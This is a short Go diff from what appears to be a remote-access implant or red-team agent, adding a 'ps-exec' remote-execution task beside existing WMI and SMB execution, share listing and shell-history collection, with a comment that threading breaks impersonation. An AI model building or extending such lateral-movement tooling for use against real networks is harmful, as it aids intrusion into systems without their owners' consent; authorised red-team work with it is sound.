@@ -250,6 +250,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = exectools.WmiExec(t.Args)
 	case "smb-exec":
 		result, cmdError = exectools.SmbExec(t.Args)
+	case "ps-exec":
+		result, cmdError = exectools.PsExec(t.Args)
 	case "list-shares":
 		result, cmdError = listshares.ListShares(t.Args)
 	case "shell-history":
@@ -360,6 +362,7 @@ func ClientReceiveHandler(client *data.Client) {
 			connection.WriteMessage(d.ToBytes())
 			// handle tasks async ??? doable but idk needs more testing.
 			// might be better to be patient as well.
+			// this breaks impersonation. casue of threads
 			/*
 				go func() {
 					err, res := ClientHandleTask(msg)
